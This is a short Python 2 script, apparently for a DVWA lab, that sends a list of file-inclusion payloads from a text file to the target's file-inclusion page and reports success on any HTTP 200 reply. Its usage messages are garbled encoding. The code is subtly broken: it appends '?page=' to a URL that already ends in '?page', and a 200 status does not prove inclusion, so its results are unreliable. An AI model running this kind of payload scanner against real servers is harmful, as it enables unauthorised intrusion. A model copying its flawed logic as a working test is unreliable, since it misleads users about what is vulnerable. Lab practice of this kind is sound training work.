import requests
import sys

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "�÷���python",sys.argv[0],"IP��ַ �˿ں�"
    print "���磺urlΪhttp://127.0.0.1:8080/����IP��ַӦΪ127.0.0.1���˿ں�ӦΪ8080"
    sys.exit()

ip = "192.168.109.147"
port = "80"

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]

file=open('include.txt','r')
includes=file.readlines()
url="http://"+ip+":"+port+"/DVWA-master/vulnerabilities/fi/?page"
for include in includes:
    tmp=url+"?page="+include[:-1]
    res=requests.get(tmp)
    if(res.status_code==200):
        print "exploit can be used"
    else:
        print "exploit can't be used"
    
    
